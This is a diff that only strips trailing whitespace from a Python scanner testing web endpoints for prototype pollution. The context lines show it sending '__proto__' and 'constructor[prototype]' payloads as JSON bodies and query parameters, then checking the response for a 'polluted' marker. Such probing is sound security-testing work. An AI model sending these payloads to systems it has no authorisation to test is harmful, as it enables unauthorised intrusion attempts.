@@ -234,16 +234,16 @@ PAYLOADS = [
 def test_json_endpoint(url, method="POST"):
     """Test JSON endpoint for prototype pollution."""
     headers = {"Content-Type": "application/json"}
-    
+
     for payload in PAYLOADS:
         r = requests.request(method, url, json=payload, headers=headers)
-        
+
         # Check if pollution persists
         check = requests.get(url)
         if "polluted" in check.text:
             print(f"[+] VULNERABLE: {json.dumps(payload)}")
             return True
-    
+
     return False
 
 def test_query_params(url):
@@ -253,13 +253,13 @@ def test_query_params(url):
         "?__proto__.polluted=yes",
         "?constructor[prototype][polluted]=yes",
     ]
-    
+
     for payload in payloads:
         r = requests.get(url + payload)
         if "polluted" in r.text:
             print(f"[+] VULNERABLE: {payload}")
             return True
-    
+
     return False
 
 if __name__ == "__main__":
